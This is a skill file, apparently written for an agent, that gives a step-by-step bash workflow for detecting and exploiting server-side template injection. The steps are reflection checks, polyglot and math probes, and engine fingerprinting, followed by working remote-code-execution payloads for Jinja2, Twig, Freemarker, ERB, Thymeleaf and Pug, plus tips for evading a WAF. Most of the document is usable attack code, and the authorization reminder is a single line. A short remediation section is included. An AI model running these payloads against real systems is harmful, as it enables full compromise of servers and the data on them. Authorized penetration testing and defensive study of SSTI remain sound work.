---
name: web-vuln-ssti
description: Server-Side Template Injection detection and exploitation across template engines
license: MIT
metadata:
  category: web-security
  locale: en
  phase: v1
---

## What this skill does

Detects Server-Side Template Injection (SSTI) vulnerabilities by injecting polyglot probes and engine-specific payloads into user-controlled inputs reflected in server responses. Identifies the template engine in use (Jinja2, Twig, Freemarker, ERB, Thymeleaf, Pug) from error messages or mathematical output, then escalates to Remote Code Execution (RCE) payloads to confirm impact.

## When to use

- When user input appears to be rendered inside a server-side template (e.g. name fields, subject lines, custom report templates, URL paths, HTTP headers)
- When a response reflects user input with unexpected evaluation (e.g. `{{7*7}}` returns `49`)
- When error messages mention template engine names (Jinja2, Twig, FreeMarker, Velocity, Smarty, etc.)
- When testing web applications built on Python (Flask/Django), PHP (Laravel/Symfony), Java (Spring/Thymeleaf), Ruby (Rails/ERB), or Node.js (Pug/Nunjucks)

## Prerequisites

- `curl` must be installed
- HTTP/HTTPS access to the target endpoint
- Knowledge of the parameter name that reflects user input in the response

## Inputs

| Variable | Description | Example |
|----------|-------------|---------|
| `TARGET_URL` | Full URL of the vulnerable endpoint | `https://app.example.com/greet` |
| `PARAM` | Query or POST parameter that reflects input | `name` |
| `METHOD` | HTTP method (`GET` or `POST`) | `GET` |
| `EXTRA_HEADERS` | Additional headers required (e.g. auth token) | `Authorization: Bearer <token>` |

## Workflow

### Step 1: Identify user input reflected in responses

```bash
TARGET_URL="https://app.example.com/greet"
PARAM="name"
METHOD="GET"
EXTRA_HEADERS=""

echo "=== Step 1: Confirm reflection ==="

send_probe() {
  local payload="$1"
  local encoded
  encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")

  if [ "$METHOD" = "POST" ]; then
    curl -s -X POST "$TARGET_URL" \
      --data "${PARAM}=${encoded}" \
      ${EXTRA_HEADERS:+-H "$EXTRA_HEADERS"} \
      --max-time 10 2>&1
  else
    curl -s -X GET "${TARGET_URL}?${PARAM}=${encoded}" \
      ${EXTRA_HEADERS:+-H "$EXTRA_HEADERS"} \
      --max-time 10 2>&1
  fi
}

echo "--- Baseline (literal string) ---"
send_probe "SSTI_TEST_12345" | grep -o "SSTI_TEST_12345" | head -3
```

### Step 2: Inject polyglot probe

```bash
echo ""
echo "=== Step 2: Polyglot SSTI probe ==="

# Polyglot triggers evaluation in Jinja2, Twig, ERB, Mako, and others
POLYGLOT='${{<%[%'"'"'"}}'
echo "[+] Sending polyglot: $POLYGLOT"
POLY_RESP=$(send_probe "$POLYGLOT")
echo "$POLY_RESP" | grep -iE "error|exception|traceback|template|jinja|twig|freemarker|syntax|unexpected" | head -10

echo ""
echo "--- Math probe: {{7*7}} / \${7*7} / <%=7*7%> ---"
for probe in '{{7*7}}' '${7*7}' '<%=7*7%>' '#{7*7}' '*{7*7}'; do
  echo -n "  Probe [$probe] -> "
  result=$(send_probe "$probe")
  if echo "$result" | grep -q "49"; then
    echo "[HIT] 49 found in response -> SSTI likely"
  else
    echo "no match"
  fi
done
```

### Step 3: Identify template engine from error or output

```bash
echo ""
echo "=== Step 3: Engine fingerprinting ==="

declare -A ENGINE_PROBES
ENGINE_PROBES["Jinja2/Python"]='{{config}}'
ENGINE_PROBES["Jinja2 filter"]='{{7|int}}'
ENGINE_PROBES["Twig/PHP"]='{{_self}}'
ENGINE_PROBES["Smarty/PHP"]='{$smarty.version}'
ENGINE_PROBES["Freemarker/Java"]='${7*7}'
ENGINE_PROBES["Velocity/Java"]='#set($x=7*7)${x}'
ENGINE_PROBES["Thymeleaf/Java"]='${T(java.lang.Math).random()}'
ENGINE_PROBES["ERB/Ruby"]='<%=7*7%>'
ENGINE_PROBES["Pug/Node"]='#{7*7}'
ENGINE_PROBES["Nunjucks/Node"]='{{range(0,7)|list}}'

for engine in "${!ENGINE_PROBES[@]}"; do
  probe="${ENGINE_PROBES[$engine]}"
  echo -n "  [$engine] probe: $probe -> "
  resp=$(send_probe "$probe")
  if echo "$resp" | grep -qE "49|true|false|config|_self|smarty|error"; then
    echo "[RESPONSE TRIGGERED] Check manually"
    echo "$resp" | grep -iE "49|config|_self|smarty|template|error" | head -2
  else
    echo "no signal"
  fi
done
```

### Step 4: Craft engine-specific RCE payloads

```bash
echo ""
echo "=== Step 4: Engine-specific RCE attempt ==="
echo "[!] Only proceed if SSTI is confirmed and you have written authorization."
echo ""

# Jinja2 (Python)
echo "--- Jinja2: read /etc/passwd ---"
JINJA2_RCE="{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}"
echo "  Payload: $JINJA2_RCE"
send_probe "$JINJA2_RCE" | grep -E "root:|uid=" | head -3

echo ""
# Jinja2 alternative (class index varies by Python version)
JINJA2_ALT="{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
echo "--- Jinja2 (alt): $JINJA2_ALT ---"
send_probe "$JINJA2_ALT" | grep -E "root:|uid=" | head -3

echo ""
# Twig (PHP)
echo "--- Twig: system('id') ---"
TWIG_RCE="{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}"
echo "  Payload: $TWIG_RCE"
send_probe "$TWIG_RCE" | grep -E "uid=" | head -3

echo ""
# Freemarker (Java)
echo "--- Freemarker: execute id ---"
FM_RCE='${"freemarker.template.utility.Execute"?new()("id")}'
echo "  Payload: $FM_RCE"
send_probe "$FM_RCE" | grep -E "uid=" | head -3

echo ""
# ERB (Ruby)
echo "--- ERB: system('id') ---"
ERB_RCE='<%= `id` %>'
echo "  Payload: $ERB_RCE"
send_probe "$ERB_RCE" | grep -E "uid=" | head -3

echo ""
# Thymeleaf (Java/Spring)
echo "--- Thymeleaf: Runtime.exec ---"
THYMEL_RCE='${T(java.lang.Runtime).getRuntime().exec("id")}'
echo "  Payload: $THYMEL_RCE"
send_probe "$THYMEL_RCE" | grep -E "uid=|Process" | head -3

echo ""
# Pug (Node.js)
echo "--- Pug: process.mainModule.exec ---"
PUG_RCE='#{function(){localLoad=global.process.mainModule.constructor._resolveFilename;return localLoad("child_process")}().execSync("id").toString()}'
echo "  Payload: $PUG_RCE"
send_probe "$PUG_RCE" | grep -E "uid=" | head -3
```

### Step 5: Document impact and remediation

```bash
echo ""
echo "=== Step 5: Impact and remediation ==="
cat <<'EOF'
Severity:
  [CRITICAL] RCE confirmed (id/whoami output in response) -> Full server compromise
  [HIGH]     SSTI confirmed but RCE not yet achieved -> code execution likely with further effort
  [MEDIUM]   Template syntax error triggered (engine fingerprinted, input not sanitized)

Remediation:
  - Never pass user input directly to template render functions (e.g. render(user_input))
  - Use sandboxed template environments where available (Jinja2 SandboxedEnvironment)
  - Separate data from templates: pass user data as template variables, not as template source
  - Apply input validation / allowlist before any template processing
  - Run template rendering in a minimal-privilege process or container
  - For Thymeleaf: disable expression preprocessing (#{...}) or restrict expression evaluation scope

Detection reference:
  - PortSwigger SSTI research: https://portswigger.net/research/server-side-template-injection
  - PayloadsAllTheThings SSTI: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
EOF
```

## Done when

- Reflection of user input is confirmed in at least one parameter
- Polyglot and math probes are tested across all major engines
- Template engine is identified (or ruled out for each engine)
- Engine-specific RCE payload is attempted and response is captured
- Impact severity and remediation recommendations are documented

## Failure modes

| Symptom | Cause | Solution |
|---------|-------|----------|
| `49` not in response but payload echoed back | Input is HTML-encoded before rendering | Try URL-encoding the payload or injecting via JSON body |
| All probes return generic 500 error | WAF or input validation blocking template syntax | Try obfuscation: `{{'7'*7}}`, `${7*'7'}`, unicode encoding of `{` and `}` |
| Jinja2 RCE payload returns empty | Class index mismatch across Python versions | Iterate subclasses: `{{''.__class__.__mro__[1].__subclasses__()}}` to find correct index for `subprocess.Popen` |
| Freemarker payload denied | SecurityManager policy active | Try lower-risk payloads: `${"".class.forName("java.lang.System").getenv()}` |
| No engine matched | Unusual or custom template engine in use | Check error messages and HTTP headers for framework clues; try Velocity and Mako payloads |

## Notes

- The Jinja2 subclass index for `subprocess.Popen` varies by Python version; enumerate subclasses first to find the correct index.
- Thymeleaf SSTI is only exploitable when user input reaches a `th:` attribute or Spring EL expression context — static templates are not vulnerable.
- SSTI in email subjects, PDF generators, and reporting tools is frequently overlooked and highly impactful.
- Use `tplmap` (https://github.com/epinna/tplmap) for automated multi-engine detection and exploitation.
